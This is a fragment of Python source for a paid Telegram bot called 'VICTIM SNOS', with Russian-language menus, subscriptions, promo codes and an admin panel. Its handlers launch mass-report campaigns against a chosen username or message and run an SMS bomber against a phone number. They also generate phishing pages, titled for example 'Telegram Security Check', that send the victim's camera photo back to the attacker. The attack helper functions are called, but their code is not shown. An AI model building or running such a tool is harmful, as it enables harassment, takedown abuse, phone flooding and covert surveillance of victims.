                   f"✅ <b>СНОС ЗАВЕРШЕН</b>\n\n"
                   f"📱 Телефон: <code>{phone}</code>\n"
                   f"📤 Всего отправлено: <b>{total_sent}</b>\n"
                   f"🔄 Раундов: {rounds}\n\n"
                   f"⏳ Кулдаун: 5 минут",
            reply_markup=get_main_menu(user_id)
        )
        
    except Exception as e:
        logger.error(f"Attack error: {e}")
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА</b>\n\n"
                   f"Произошла ошибка при выполнении атаки",
            reply_markup=get_main_menu(user_id)
        )
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

@dp.callback_query(F.data == "snos_username")
async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
    """Начало сноса по username"""
    user_lock = await get_user_lock(cb.from_user.id)
    
    async with user_lock:
        if cb.from_user.id in active_attacks:
            await cb.answer("❌ Активная атака уже идет!", show_alert=True)
            return
        
        can_attack, remaining = await check_cooldown(cb.from_user.id)
        if not can_attack:
            await cb.answer(
                f"⏳ Подождите {int(remaining)} сек.",
                show_alert=True
            )
            return
    
    await state.set_state(AttackState.waiting_username)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "snos_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "👤 Введите username (без @):\n"
        "<i>Пример: username</i>",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_username))
async def snos_username_received(msg: types.Message, state: FSMContext):
    """Получен username"""
    username = msg.text.strip().replace("@", "")
    await state.update_data(username=username)
    await state.set_state(AttackState.waiting_count)
    
    await msg.delete()
    await msg.answer(
        f"<b>🔱 VICTIM SNOS</b>\n\n"
        f"👤 Username: @{username}\n\n"
        f"Введите количество раундов (1-{MAX_ROUNDS}):"
    )

@dp.message(StateFilter(AttackState.waiting_count))
async def snos_username_count(msg: types.Message, state: FSMContext):
    """Получено количество раундов для username"""
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > MAX_ROUNDS:
            raise ValueError()
    except:
        await msg.delete()
        await send_message_with_banner(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
        return
    
    data = await state.get_data()
    username = data["username"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    # Блокировка
    user_lock = await get_user_lock(user_id)
    
    async with user_lock:
        if user_id in active_attacks:
            await send_message_with_banner(msg, "❌ Атака уже запущена!")
            return
        
        stop_event = asyncio.Event()
        active_attacks[user_id] = stop_event
    
    # Статус сообщение
    status_msg = await send_message_with_banner(
        msg,
        f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n"
        f"👤 Username: @{username}\n"
        f"🔄 Раунд: 0/{rounds}\n"
        f"📤 Жалоб: 0"
    )
    
    async def update_progress(current: int, total: int, reports: int):
        try:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                       f"🎯 <b>СНОС АКТИВЕН</b>\n\n"
                       f"👤 Username: @{username}\n"
                       f"🔄 Раунд: {current}/{total}\n"
                       f"📤 Жалоб: {reports}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]
                ])
            )
        except:
            pass
    
    # Запуск атаки
    try:
        total_reports = await snos_attack_username(
            user_id,
            username,
            rounds,
            stop_event,
            update_progress
        )
        
        set_cooldown(user_id)
        
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ <b>СНОС ЗАВЕРШЕН</b>\n\n"
                   f"👤 Username: @{username}\n"
                   f"📤 Всего жалоб: <b>{total_reports}</b>\n"
                   f"🔄 Раундов: {rounds}",
            reply_markup=get_main_menu(user_id)
        )
        
    except Exception as e:
        logger.error(f"Attack error: {e}")
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА</b>",
            reply_markup=get_main_menu(user_id)
        )
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

@dp.callback_query(F.data == "report_message")
async def report_message_start(cb: types.CallbackQuery, state: FSMContext):
    """Начало жалобы на сообщение"""
    user_lock = await get_user_lock(cb.from_user.id)
    
    async with user_lock:
        if cb.from_user.id in active_attacks:
            await cb.answer("❌ Активная атака уже идет!", show_alert=True)
            return
        
        can_attack, remaining = await check_cooldown(cb.from_user.id)
        if not can_attack:
            await cb.answer(
                f"⏳ Подождите {int(remaining)} сек.",
                show_alert=True
            )
            return
        
        active_attacks[cb.from_user.id] = asyncio.Event()
    
    await state.set_state(AttackState.waiting_link)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "snos_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "💬 Введите ссылку на сообщение:\n"
        "<i>Пример: https://t.me/channel/123</i>",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_link))
async def report_message_link(msg: types.Message, state: FSMContext):
    """Получена ссылка на сообщение"""
    link = msg.text.strip()
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    status_msg = await send_message_with_banner(
        msg,
        f"📤 <b>ОТПРАВКА ЖАЛОБ</b>\n\n"
        f"🔗 Ссылка: {link}\n"
        f"⏳ Обработка..."
    )
    
    try:
        reports, error = await mass_report_message(user_id, link)
        set_cooldown(user_id)
        
        if error:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                       f"❌ <b>ОШИБКА</b>\n\n"
                       f"{error}",
                reply_markup=get_main_menu(user_id)
            )
        else:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                       f"✅ <b>ЖАЛОБЫ ОТПРАВЛЕНЫ</b>\n\n"
                       f"📤 Отправлено: <b>{reports}</b> жалоб",
                reply_markup=get_main_menu(user_id)
            )
            
    except Exception as e:
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА</b>\n\n"
                   f"Произошла ошибка",
            reply_markup=get_main_menu(user_id)
        )
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

@dp.callback_query(F.data == "bomber_menu")
async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
    """Меню бомбера"""
    user_lock = await get_user_lock(cb.from_user.id)
    
    async with user_lock:
        if cb.from_user.id in active_attacks:
            await cb.answer("❌ Активная атака уже идет!", show_alert=True)
            return
        
        can_attack, remaining = await check_cooldown(cb.from_user.id)
        if not can_attack:
            await cb.answer(
                f"⏳ Подождите {int(remaining)} сек.",
                show_alert=True
            )
            return
    
    await state.set_state(AttackState.waiting_phone)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "main_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "💣 <b>SMS БОМБЕР</b>\n\n"
        "📱 Введите номер телефона:",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    """Получен номер для бомбера"""
    phone = msg.text.strip()
    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)
    
    await msg.delete()
    await msg.answer(
        f"<b>🔱 VICTIM SNOS</b>\n\n"
        f"📱 Телефон: <code>{phone}</code>\n\n"
        f"Введите количество раундов (1-5):"
    )

@dp.message(StateFilter(AttackState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    """Получено количество раундов для бомбера"""
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > 5:
            raise ValueError()
    except:
        await msg.delete()
        await send_message_with_banner(msg, "❌ Введите число от 1 до 5!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    # Блокировка
    user_lock = await get_user_lock(user_id)
    
    async with user_lock:
        if user_id in active_attacks:
            await send_message_with_banner(msg, "❌ Атака уже запущена!")
            return
        
        stop_event = asyncio.Event()
        active_attacks[user_id] = stop_event
    
    status_msg = await send_message_with_banner(
        msg,
        f"💣 <b>БОМБЕР ЗАПУЩЕН</b>\n\n"
        f"📱 Телефон: <code>{phone}</code>\n"
        f"🔄 Раунд: 0/{rounds}\n"
        f"📨 Отправлено: 0"
    )
    
    async def update_progress(current: int, total: int, sent: int):
        try:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                       f"💣 <b>БОМБЕР АКТИВЕН</b>\n\n"
                       f"📱 Телефон: <code>{phone}</code>\n"
                       f"🔄 Раунд: {current}/{total}\n"
                       f"📨 Отправлено: {sent}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]
                ])
            )
        except:
            pass
    
    try:
        total_sent = await bomber_attack(
            phone,
            rounds,
            user_id,
            stop_event,
            update_progress
        )
        
        set_cooldown(user_id)
        
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ <b>БОМБЕР ЗАВЕРШЕН</b>\n\n"
                   f"📱 Телефон: <code>{phone}</code>\n"
                   f"📨 Всего SMS: <b>{total_sent}</b>\n"
                   f"🔄 Раундов: {rounds}",
            reply_markup=get_main_menu(user_id)
        )
        
    except Exception as e:
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА</b>",
            reply_markup=get_main_menu(user_id)
        )
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

@dp.callback_query(F.data == "phish_menu")
async def phish_menu(cb: types.CallbackQuery, state: FSMContext):
    """Меню фишинга"""
    await state.set_state(AttackState.waiting_title)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "main_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "🎣 <b>ФИШИНГ</b>\n\n"
        "Введите заголовок страницы:\n"
        "<i>Например: Telegram Security Check</i>",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_title))
async def phish_title(msg: types.Message, state: FSMContext):
    """Создание фишинговой страницы"""
    title = msg.text.strip()
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    status_msg = await send_message_with_banner(
        msg,
        "🎣 <b>СОЗДАНИЕ СТРАНИЦЫ</b>\n\n"
        "⏳ Пожалуйста, подождите..."
    )
    
    page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:10]
    url = await create_phishing_page(title, user_id, page_id)
    
    if url:
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ <b>СТРАНИЦА СОЗДАНА</b>\n\n"
                   f"🔗 Ссылка:\n<code>{url}</code>\n\n"
                   f"📸 При переходе жертвы по ссылке и разрешении камеры "
                   f"вы получите фото в этот чат.",
            reply_markup=get_main_menu(user_id)
        )
    else:
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"❌ <b>ОШИБКА СОЗДАНИЯ</b>\n\n"
                   f"Попробуйте позже",
            reply_markup=get_main_menu(user_id)
        )

@dp.message(F.photo)
async def handle_phish_photo(msg: types.Message):
    """Обработка фото от фишинга"""
    if msg.caption:
        for page_id, page in list(phish_pages.items()):
            if page_id in msg.caption and msg.chat.id == page.get("chat_id"):
                logger.info(f"Phishing photo received from {page_id}")
                await msg.reply(
                    "📸 <b>ФОТО ПОЛУЧЕНО!</b>\n\n"
                    f"ID страницы: <code>{page_id}</code>"
                )
                break

@dp.callback_query(F.data == "purchase_menu")
async def purchase_menu(cb: types.CallbackQuery):
    """Меню покупки"""
    buttons = [
        [("💎 30 дней - 100₽", "buy_30d")],
        [("💎 60 дней - 200₽", "buy_60d")],
        [("👑 Навсегда - 400₽", "buy_forever")],
        [("🎁 Промокод", "use_promo")],
        [("◀️ НАЗАД", "main_menu")]
    ]
    
    await cb.message.edit_caption(
        caption="<b>🔱 VICTIM SNOS</b>\n\n"
               "<b>💰 ПРИОБРЕТЕНИЕ ДОСТУПА</b>\n\n"
               "Выберите тариф:",
        reply_markup=create_keyboard(buttons)
    )

@dp.callback_query(F.data.startswith("buy_"))
async def buy_subscription(cb: types.CallbackQuery):
    """Покупка подписки"""
    duration = cb.data.replace("buy_", "")
    
    prices = {
        "30d": ("30 дней", 100),
        "60d": ("60 дней", 200),
        "forever": ("Навсегда", 400)
    }
    
    name, price = prices[duration]
    
    await bot.send_invoice(
        chat_id=cb.from_user.id,
        title=f"VICTIM SNOS - {name}",
        description=f"Доступ к боту на {name}",
        payload=f"sub_{duration}",
        provider_token=PAYMENT_PROVIDER_TOKEN,
        currency="RUB",
        prices=[LabeledPrice(label=name, amount=price * 100)],
        start_parameter="victim_snos",
        protect_content=True
    )
    
    await cb.message.delete()
    await cb.message.answer(
        f"💳 <b>СЧЕТ ВЫСТАВЛЕН</b>\n\n"
        f"Тариф: {name}\n"
        f"Сумма: {price}₽"
    )

@dp.pre_checkout_query()
async def process_pre_checkout(pre_checkout_query: PreCheckoutQuery):
    """Обработка pre-checkout"""
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@dp.message(F.successful_payment)
async def process_successful_payment(msg: types.Message):
    """Успешная оплата"""
    payload = msg.successful_payment.invoice_payload
    
    if payload.startswith("sub_"):
        duration = payload.replace("sub_", "")
        
        if duration == "forever":
            add_subscription(msg.from_user.id, forever=True)
            text = "навсегда"
        else:
            days = int(duration.replace("d", ""))
            add_subscription(msg.from_user.id, days=days)
            text = f"на {days} дней"
        
        await msg.answer(
            f"✅ <b>ОПЛАТА УСПЕШНА!</b>\n\n"
            f"Доступ активирован {text}\n"
            f"Используйте /start для начала работы"
        )

@dp.callback_query(F.data == "use_promo")
async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
    """Активация промокода"""
    await state.set_state(PurchaseState.waiting_promo)
    await cb.message.delete()
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "🎁 Введите промокод:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("❌ Отмена", "purchase_menu")]
        ])
    )

@dp.message(StateFilter(PurchaseState.waiting_promo))
async def process_promo(msg: types.Message, state: FSMContext):
    """Обработка промокода"""
    code = msg.text.strip().upper()
    await msg.delete()
    await state.clear()
    
    if code in promo_codes:
        promo = promo_codes[code]
        if promo["uses"] > 0:
            add_subscription(msg.from_user.id, days=promo["days"])
            promo["uses"] -= 1
            save_promo_codes()
            
            await send_message_with_banner(
                msg,
                f"✅ Промокод активирован!\n"
                f"Доступ добавлен на {promo['days']} дней",
                get_main_menu(msg.from_user.id)
            )
        else:
            await send_message_with_banner(
                msg,
                "❌ Промокод больше не действителен",
                get_purchase_menu()
            )
    else:
        await send_message_with_banner(
            msg,
            "❌ Неверный промокод",
            get_purchase_menu()
        )

@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    """Статус пользователя"""
    user_id = cb.from_user.id
    user_id_str = str(user_id)
    
    # Информация о подписке
    if user_id_str in ALLOWED_USERS:
        expire = ALLOWED_USERS[user_id_str].get("expire_date", "неизвестно")
        if expire != "forever":
            try:
                expire_date = datetime.fromisoformat(expire)
                days_left = (expire_date - datetime.now()).days
                expire = f"{expire_date.strftime('%d.%m.%Y')} ({days_left} дн.)"
            except:
                pass
    else:
        expire = "Нет доступа"
    
    # Статистика пула
    pool_stats = global_session_pool.get_stats()
    
    # Кулдаун
    can_attack, remaining = await check_cooldown(user_id)
    cooldown_text = f"Готов к атаке" if can_attack else f"Кулдаун: {int(remaining)} сек"
    
    await cb.message.edit_caption(
        caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
               f"<b>📊 СТАТУС</b>\n\n"
               f"🆔 ID: <code>{user_id}</code>\n"
               f"📅 Подписка: {expire}\n"
               f"⏰ {cooldown_text}\n\n"
               f"<b>📈 ПУЛ СЕССИЙ</b>\n"
               f"📱 Всего: {pool_stats['total']}\n"
               f"✅ Доступно: {pool_stats['available']}\n"
               f"💚 Здоровых: {pool_stats['healthy']}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("◀️ НАЗАД", "main_menu")]
        ])
    )

@dp.callback_query(F.data == "stop")
async def stop_attack(cb: types.CallbackQuery):
    """Остановка атаки"""
    user_id = cb.from_user.id
    
    if user_id in active_attacks:
        active_attacks[user_id].set()
        del active_attacks[user_id]
        await cb.answer("✅ Атака остановлена", show_alert=True)
    else:
        await cb.answer("❌ Нет активных атак", show_alert=True)

@dp.callback_query(F.data == "stop_attack")
async def stop_attack_button(cb: types.CallbackQuery):
    """Остановка атаки через кнопку"""
    await stop_attack(cb)
    await cb.message.edit_caption(
        caption="<b>🔱 VICTIM SNOS</b>\n\n"
               "⏹ <b>АТАКА ОСТАНОВЛЕНА</b>",
        reply_markup=get_main_menu(cb.from_user.id)
    )

@dp.callback_query(F.data == "main_menu")
async def main_menu(cb: types.CallbackQuery, state: FSMContext):
    """Главное меню"""
    await state.clear()
    await cb.message.edit_caption(
        caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите действие:",
        reply_markup=get_main_menu(cb.from_user.id)
    )

# ---------- АДМИН ПАНЕЛЬ ----------
@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    """Админ панель"""
    await msg.delete()
    
    if msg.from_user.id != ADMIN_ID:
        return
    
    buttons = [
        [("➕ Добавить", "admin_add")],
        [("➖ Удалить", "admin_remove")],
        [("🎁 Создать промокод", "admin_create_promo")],
        [("📋 Список", "admin_list")],
        [("📊 Статистика", "admin_stats")],
        [("◀️ НАЗАД", "main_menu")]
    ]
    
    await send_message_with_banner(
        msg,
        "<b>👑 АДМИН ПАНЕЛЬ</b>",
        create_keyboard(buttons, adjust=2)
    )

@dp.callback_query(F.data == "admin_add")
async def admin_add_start(cb: types.CallbackQuery, state: FSMContext):
    """Добавление пользователя"""
    if cb.from_user.id != ADMIN_ID:
        return
    
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    
    await cb.message.answer(
        "<b>👑 АДМИН</b>\n\n"
        "Введите ID пользователя:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("❌ Отмена", "admin_menu")]
        ])
    )

@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_add_user(msg: types.Message, state: FSMContext):
    """Обработка ID пользователя"""
    if msg.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(msg.text.strip())
        add_subscription(user_id, forever=True)
        
        await msg.delete()
        await send_message_with_banner(
            msg,
            f"✅ Пользователь <code>{user_id}</code> добавлен навсегда",
            get_admin_menu()
        )
    except:
        await msg.delete()
        await send_message_with_banner(msg, "❌ Неверный ID!")
    
    await state.clear()

@dp.callback_query(F.data == "admin_create_promo")
async def admin_promo_start(cb: types.CallbackQuery, state: FSMContext):
    """Создание промокода"""
    if cb.from_user.id != ADMIN_ID:
        return
    
    await state.set_state(AdminState.waiting_promo_code)
    await cb.message.delete()
    
    await cb.message.answer(
        "<b>👑 АДМИН</b>\n\n"
        "Введите промокод:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("❌ Отмена", "admin_menu")]
        ])
    )

@dp.message(StateFilter(AdminState.waiting_promo_code))
async def admin_promo_code(msg: types.Message, state: FSMContext):
    """Получен код промокода"""
    if msg.from_user.id != ADMIN_ID:
        return
    
    code = msg.text.strip().upper()
    await state.update_data(promo_code=code)
    await state.set_state(AdminState.waiting_promo_days)
    
    await msg.delete()
    await msg.answer("Введите количество дней:")

@dp.message(StateFilter(AdminState.waiting_promo_days))
async def admin_promo_days(msg: types.Message, state: FSMContext):
    """Получены дни"""
    if msg.from_user.id != ADMIN_ID:
        return
    
    try:
        days = int(msg.text.strip())
        await state.update_data(promo_days=days)
        await state.set_state(AdminState.waiting_promo_uses)
        
        await msg.delete()
        await msg.answer("Введите количество использований:")
    except:
        await msg.delete()
        await send_message_with_banner(msg, "❌ Неверное число!")

@dp.message(StateFilter(AdminState.waiting_promo_uses))
async def admin_promo_uses(msg: types.Message, state: FSMContext):
    """Создание промокода"""
    if msg.from_user.id != ADMIN_ID:
        return
    
    try:
        uses = int(msg.text.strip())
        data = await state.get_data()
        
        promo_codes[data["promo_code"]] = {
            "days": data["promo_days"],
            "uses": uses
        }
        save_promo_codes()
        
        await msg.delete()
        await send_message_with_banner(
            msg,
            f"✅ Промокод создан!\n\n"
            f"Код: <code>{data['promo_code']}</code>\n"
            f"Дней: {data['promo_days']}\n"
            f"Использований: {uses}",
            get_admin_menu()
        )
    except:
        await msg.delete()
        await send_message_with_banner(msg, "❌ Неверное число!")
    
    await state.clear()

@dp.callback_query(F.data == "admin_remove")
async def admin_remove_menu(cb: types.CallbackQuery):
    """Меню удаления пользователей"""
    if cb.from_user.id != ADMIN_ID:
        return
    
    if not ALLOWED_USERS:
        await cb.answer("Список пуст", show_alert=True)
        return
    
    buttons = []
    for uid in list(ALLOWED_USERS.keys())[:20]:
        buttons.append([(f"❌ Удалить {uid}", f"remove_{uid}")])
    
    buttons.append([("◀️ НАЗАД", "admin_menu")])
    
    await cb.message.edit_caption(
        caption="<b>👑 УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЕЙ</b>",
        reply_markup=create_keyboard(buttons)
    )

@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_user(cb: types.CallbackQuery):
    """Удаление пользователя"""
    if cb.from_user.id != ADMIN_ID:
        return
    
    user_id = cb.data.replace("remove_", "")
    if user_id in ALLOWED_USERS:
        del ALLOWED_USERS[user_id]
        save_allowed_users()
    
    await cb.message.edit_caption(
        caption=f"<b>👑 АДМИН</b>\n\n"
               f"✅ Пользователь <code>{user_id}</code> удален",
        reply_markup=get_admin_menu()
    )

@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    """Список пользователей"""
    if cb.from_user.id != ADMIN_ID:
        return
    
    text = "<b>👑 ПОЛЬЗОВАТЕЛИ</b>\n\n"
    
    for uid, data in list(ALLOWED_USERS.items())[:30]:
        expire = data.get("expire_date", "неизвестно")
        if expire != "forever":
            try:
                expire = datetime.fromisoformat(expire).strftime("%d.%m.%Y")
            except:
                pass
        text += f"<code>{uid}</code> - {expire}\n"
    
    if not ALLOWED_USERS:
        text += "Пусто"
    
    await cb.message.edit_caption(
        caption=text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("◀️ НАЗАД", "admin_menu")]
        ])
    )

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(cb: types.CallbackQuery):
    """Статистика для админа"""
    if cb.from_user.id != ADMIN_ID:
        return
    
    pool_stats = global_session_pool.get_stats()
    active_attacks_count = len(active_attacks)
    users_count = len(ALLOWED_USERS)
    
    text = (
        f"<b>👑 СТАТИСТИКА</b>\n\n"
        f"👥 Пользователей: {users_count}\n"
        f"⚔️ Активных атак: {active_attacks_count}\n\n"
        f"<b>📊 ПУЛ СЕССИЙ</b>\n"
        f"📱 Всего: {pool_stats['total']}\n"
        f"✅ Доступно: {pool_stats['available']}\n"
        f"💚 Здоровых: {pool_stats['healthy']}\n"
        f"🔄 Готов: {'Да' if pool_stats['ready'] else 'Нет'}"
    )
    
    await cb.message.edit_caption(
        caption=text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [create_button("◀️ НАЗАД", "admin_menu")]
        ])
    )

def get_admin_menu() -> InlineKeyboardMarkup:
    """Клавиатура админ меню"""
    buttons = [
        [create_button("◀️ НАЗАД", "admin_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_purchase_menu() -> InlineKeyboardMarkup:
    """Клавиатура меню покупки"""
    buttons = [
        [create_button("💰 КУПИТЬ ДОСТУП", "purchase_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ---------- ЗАПУСК ----------
async def on_startup():
    """Действия при запуске"""
    load_allowed_users()
    load_promo_codes()
    
    os.makedirs("sessions", exist_ok=True)
    
    # Запускаем инициализацию пула в фоне
    asyncio.create_task(initialize_session_pool())
    
    # Запускаем поддержку пула
    asyncio.create_task(maintain_session_pool())
    
    logger.info("Bot started!")

async def main():
    """Главная функция"""
    await on_startup()
    
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
